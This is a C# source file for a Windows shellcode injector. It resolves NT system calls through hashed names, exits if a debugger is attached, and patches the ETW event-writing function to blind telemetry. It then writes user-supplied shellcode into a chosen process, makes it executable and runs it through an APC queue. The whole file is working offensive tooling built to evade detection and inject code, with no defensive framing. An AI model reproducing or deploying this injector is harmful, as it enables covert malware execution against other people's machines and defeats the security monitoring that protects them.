using System.Runtime.InteropServices;
using System.Diagnostics;
using DynamicSyscalls;
using System.Threading;

class Program
{
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int NtAllocateVirtualMemoryDelegate(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref uint RegionSize,
        uint AllocationType,
        uint Protect
    );

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int NtOpenProcessDelegate(
    out IntPtr ProcessHandle,
    uint DesiredAccess,
    ref OBJECT_ATTRIBUTES ObjectAttributes,
    ref CLIENT_ID ClientId
);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int NtProtectVirtualMemoryDelegate(
    IntPtr ProcessHandle,
    ref IntPtr BaseAddress,
    ref uint RegionSize,
    uint NewProtect,
    out uint OldProtect
);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int NtWriteVirtualMemoryDelegate(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        byte[] Buffer,
        uint NumberOfBytesToWrite,
        out uint NumberOfBytesWritten
    );

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int NtQueueApcThreadEx2Delegate(
        IntPtr ThreadHandle,
        IntPtr ReserveHandle,
        uint ApcFlags,
        IntPtr ApcRoutine,
        IntPtr ApcArgument1,
        IntPtr ApcArgument2,
        IntPtr ApcArgument3
    );

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int NtCloseDelegate(IntPtr hObject);

    // DllImports
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string name);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerAttached);

    [DllImport("kernel32.dll")]
    static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    // constants
    const uint PROCESS_VM_READ = 0x0010;
    const uint PROCESS_VM_OPERATION = 0x0008;
    const uint THREAD_SET_CONTEXT = 0x0010;
    const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
    const uint PROCESS_VM_WRITE = 0x0020;

    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint PAGE_READWRITE = 0x04;
    const uint PAGE_EXECUTE_READ = 0x20;

    // MD5 Hashes
    const string HASH_NT_ALLOCATE_VIRTUAL_MEMORY = "445748b2bdab65055f58ca90ffd62c56";
    const string HASH_NT_WRITE_VIRTUAL_MEMORY = "274e21507fce26a09c731cb2a89f6702";
    const string HASH_NT_PROTECT_VIRTUAL_MEMORY = "c09797ed8039245eacbc8afc05d71795";
    const string HASH_NT_OPEN_PROCESS = "c03e64ea7a9cb82ea3f7e3eb68f5619b";
    const string HASH_NT_QUEUE_APC_THREAD_EX2 = "844572302fa14b71743ad191b8ae0b2f";
    const string HASH_NT_CLOSE = "0136d251bb595c1d48a75d4cc27d71c8";

    // Structures
    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    static byte[] LoadShellcode(string input)
    {
        input = input.Trim();

        if (input.StartsWith("0x"))
            return Convert.FromHexString(input.Substring(2));

        if (input.Contains('+') || input.Contains('/'))
            return Convert.FromBase64String(input);

        if (File.Exists(input))
            return File.ReadAllBytes(input);

        return Convert.FromHexString(input);
    }

    static void PatchETWcall()
    {
        IntPtr etwEventWrite = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");

        for (byte offset = 0; offset <= 100; offset++)
        {
            byte[] bytes = new byte[10];
            Marshal.Copy(etwEventWrite + offset, bytes, 0, 10);

            if (bytes[0] == 0xE8 && bytes[9] == 0xC3)
            {
                byte[] patch = { 0x90, 0x90, 0x90, 0x90, 0x90 };
                IntPtr patchAddr = etwEventWrite + offset;

                uint oldProtect;
                VirtualProtect(patchAddr, 5, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, patchAddr, 5);
                VirtualProtect(patchAddr, 5, oldProtect, out oldProtect);

                Console.WriteLine("[+] ETW call patched successfully");
                break;
            }
        }
    }

    static byte[][] GenerateKeyChain(int length, int chunks)
    {
        Random rnd = new Random();
        byte[][] keys = new byte[chunks][];
        int chunkSize = length / chunks;

        for (int chunk = 0; chunk < chunks; chunk++)
        {
            int currentSize = (chunk == chunks - 1) ? length - chunk * chunkSize : chunkSize;
            keys[chunk] = new byte[currentSize];
            for (int i = 0; i < currentSize; i++)
                keys[chunk][i] = (byte)rnd.Next(1, 255);
        }
        return keys;
    }

    static byte[] EncryptWithKeyChain(byte[] shellcode, byte[][] keys)
    {
        byte[] encrypted = new byte[shellcode.Length];
        int chunkSize = shellcode.Length / keys.Length;

        for (int chunk = 0; chunk < keys.Length; chunk++)
        {
            int start = chunk * chunkSize;
            int end = (chunk == keys.Length - 1) ? shellcode.Length : start + chunkSize;
            for (int i = start; i < end; i++)
                encrypted[i] = (byte)(shellcode[i] ^ keys[chunk][i - start]);
        }
        return encrypted;
    }

    static byte[] SleepJitter(byte[] shellcode)
    {
        try
        {
            Random rnd = new Random();
            int initialDelay = rnd.Next(5000, 15000);

            byte[][] keys = GenerateKeyChain(shellcode.Length, 10);
            byte[] encrypted = EncryptWithKeyChain(shellcode, keys);

            var sw = Stopwatch.StartNew();
            while (sw.ElapsedMilliseconds < initialDelay)
            {
                if (rnd.Next(100) < 10)
                {
                    string temp = new string('A', rnd.Next(50, 200));
                    GC.Collect();
                }
                Thread.Sleep(1);
            }

            int totalChunks = 10;
            int chunkSize = shellcode.Length / totalChunks;

            for (int chunk = 0; chunk < totalChunks; chunk++)
            {
                int start = chunk * chunkSize;
                int end = (chunk == totalChunks - 1) ? shellcode.Length : start + chunkSize;

                for (int i = start; i < end; i++)
                {
                    encrypted[i] = (byte)(encrypted[i] ^ keys[chunk % keys.Length][i - start]);
                }

                if (chunk < totalChunks - 1)
                {
                    int delay = rnd.Next(50, 300);
                    Thread.Sleep(delay);
                }
            }

            return encrypted;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Incremental decrypt failed: {ex.Message}");
            return shellcode;
        }
    }

    static void AntiMemoryDump()
    {
        Random rnd = new Random();
        for (int i = 0; i < 100; i++)
        {
            IntPtr ptr = Marshal.AllocHGlobal(1024);
            byte[] random = new byte[1024];
            rnd.NextBytes(random);
            Marshal.Copy(random, 0, ptr, 1024);
            Marshal.FreeHGlobal(ptr);
        }
    }

    static void Main()
    {
        if (System.Diagnostics.Debugger.IsAttached)
        {
            Environment.Exit(0);
        }

        bool isDebuggerPresent = false;
        CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
        if (isDebuggerPresent) Environment.Exit(0);

        AntiMemoryDump();
        PatchETWcall();

        try
        {
            Console.Write("Enter process name (Check output from any realname-reader script, enter without the .exe extension): ");
            string procName = Console.ReadLine();

            Process[] procs = Process.GetProcessesByName(procName);
            Process target = procs[0];

            CLIENT_ID cid = new CLIENT_ID
            {
                UniqueProcess = (IntPtr)target.Id,
                UniqueThread = IntPtr.Zero
            };

            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES
            {
                Length = Marshal.SizeOf<OBJECT_ATTRIBUTES>(),
                Attributes = 0x40
            };

            Console.Write("Enter your shellcode (hex/base64/bin file): ");
            string input = Console.ReadLine();
            byte[] shellcode = LoadShellcode(input);

            var ntOpen = DynamicInvoke.GetDelegate<NtOpenProcessDelegate>(HASH_NT_OPEN_PROCESS, true);
            var ntAlloc = DynamicInvoke.GetDelegate<NtAllocateVirtualMemoryDelegate>(HASH_NT_ALLOCATE_VIRTUAL_MEMORY, true);
            var ntWrite = DynamicInvoke.GetDelegate<NtWriteVirtualMemoryDelegate>(HASH_NT_WRITE_VIRTUAL_MEMORY, true);
            var ntApc = DynamicInvoke.GetDelegate<NtQueueApcThreadEx2Delegate>(HASH_NT_QUEUE_APC_THREAD_EX2, true);
            var ntClose = DynamicInvoke.GetDelegate<NtCloseDelegate>(HASH_NT_CLOSE, true);
            var ntProtect = DynamicInvoke.GetDelegate<NtProtectVirtualMemoryDelegate>(HASH_NT_PROTECT_VIRTUAL_MEMORY, true);

            IntPtr hProcess;
            int processStatus = ntOpen(out hProcess, PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_QUERY_LIMITED_INFORMATION, ref oa, ref cid);
            if (processStatus != 0 || hProcess == IntPtr.Zero)
            {
                Console.WriteLine($"[!] NtOpenProcess failed: 0x{processStatus:X}. Press any key to exit...");
                Console.ReadKey();
                return;
            }

            IntPtr baseAddress = IntPtr.Zero;
            uint regionSize = (uint)shellcode.Length;
            int allocatedMemStatus = ntAlloc(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (allocatedMemStatus != 0)
            {
                Console.WriteLine($"[!] NtAllocateVirtualMemory failed: 0x{allocatedMemStatus:X}. Press any key to exit...");
                ntClose(hProcess);
                Console.ReadKey();
                return;
            }

            byte[] processedShellcode = SleepJitter(shellcode);
            uint bytesWritten;
            int writeStatus = ntWrite(hProcess, baseAddress, processedShellcode,
                                      (uint)processedShellcode.Length, out bytesWritten);
            if (writeStatus != 0)
            {
                Console.WriteLine($"[!] NtWriteVirtualMemory failed: 0x{writeStatus:X}");
                ntClose(hProcess);
                Console.ReadKey();
                return;
            }

            uint oldProtect;
            int protectStatus = ntProtect(hProcess, ref baseAddress, ref regionSize, PAGE_EXECUTE_READ, out oldProtect);
            if (protectStatus != 0)
            {
                Console.WriteLine($"[!] NtProtectVirtualMemory failed: 0x{protectStatus:X}");
                ntClose(hProcess);
                Console.ReadKey();
                return;
            }

            IntPtr hThread = IntPtr.Zero;
            foreach (ProcessThread thread in target.Threads)
            {
                try
                {
                    hThread = OpenThread(THREAD_SET_CONTEXT, false, (uint)thread.Id);
                    if (hThread != IntPtr.Zero)
                    {
                        break;
                    }
                }
                catch { continue; }
            }

            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("[!] No suitable thread found. Press any key to exit...");
                ntClose(hProcess);
                Console.ReadKey();
                return;
            }

            int apcStatus = ntApc(
                hThread,
                IntPtr.Zero,
                0x1,
                baseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero);

            if (apcStatus == 0)
            {
                Console.WriteLine("[+] Success");
                Console.WriteLine($"Bytes written: {shellcode.Length}");
                ntClose(hThread);
                ntClose(hProcess);
            }
            else
            {
                Console.WriteLine($"[!] APC failed: 0x{apcStatus:X}");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An unknown error has occurred: {ex}");
            Console.ReadKey();
        }

        Console.WriteLine("Press any key to exit...");
        Console.ReadKey();
    }
}